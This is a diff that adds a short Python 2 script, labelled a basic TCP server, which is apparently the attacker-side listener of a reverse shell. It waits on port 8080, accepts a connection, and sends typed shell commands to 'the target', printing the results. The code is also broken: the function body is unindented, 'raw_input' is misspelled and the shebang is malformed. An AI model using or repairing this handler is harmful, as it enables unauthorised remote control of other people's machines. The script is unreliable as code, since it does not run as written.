@@ -1,0 +1,27 @@
+#basic Tcp Server
+#!/bin/env_python
+import socket #for building tcp connection
+
+def connect():
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket  object 's'
+s.bind(("192.168.240.132", 8080))
+s.listen(1)
+
+print '[+] listening for incoming tcp connection on port 8080'
+conn, addr = s.accept()
+print'[+] we got a connection from: ', addr
+
+while True:
+    command = raw _input("shell> ")# get the user input and store it in a command  variable.
+    if 'terminate' in command: # if we got terminate command, inform the client and  close the connect and break the loop 
+        conn.send('terminate')
+        conn.close()
+        break
+    else:
+		conn.send(command) # otherwise we will send the command to the target
+		print conn.recv(1024) #print the result that we got back
+def main():
+    connect()
+main()
+
+
